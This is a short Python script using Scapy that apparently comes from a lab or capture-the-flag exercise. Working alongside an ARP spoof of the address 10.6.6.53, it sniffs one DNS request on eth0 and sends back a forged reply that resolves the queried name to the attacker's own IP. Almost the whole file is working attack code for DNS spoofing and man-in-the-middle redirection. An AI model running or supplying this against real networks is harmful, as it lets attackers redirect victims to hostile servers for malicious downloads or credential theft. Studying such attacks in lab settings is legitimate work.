#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

# destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.6.53"

def handle_dns_request(packet):
    # Construct the right DNS response packet
    # Fill in the OSI layer 2 packet details (i.e. Ethernet)
    eth = Ether(src=macaddr,                                        # Ethernet source MAC-address set to our own MAC-address
                dst=packet.src)                                     # Ethernet destination MAC address set to the one of the requesting party

    # Fill in the layer 3 IP packet details
    ip  = IP(dst=packet[IP].src,                                    # Set the destination IP to the one of the requester
             src=ipaddr_we_arp_spoofed)                             # Act as if the packet originates from the spoofed IP address

    # Fill in the UDP packet details
    udp = UDP(dport=packet[UDP].sport,                              # Make sure the UDP packet is sent to the port from which the request originated
              sport=53)                                             # Source port is 53, DNS

    # Fill in the DNS packet details
    dns = DNS(ancount=1,                                            # 1 answer in the DNS Resource Record (DNSRR)
              an=DNSRR(rrname=packet[DNSQR].qname,                  # The queried domain name (i.e. ftp.osuosl.or)
                       rdata=ipaddr),                               # The IP address of the queried domain name (i.e. our own IP address)
              id=packet[DNS].id,                                    # Return the packet id from the DNS request
              qd=packet[DNS].qd,                                    # Return the Question Record from the DNS request
              qr=1)                                                 # It's a DNS response
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")

def main():
    berkeley_packet_filter = " and ".join([
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ])
    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)

if __name__ == "__main__":
    main()

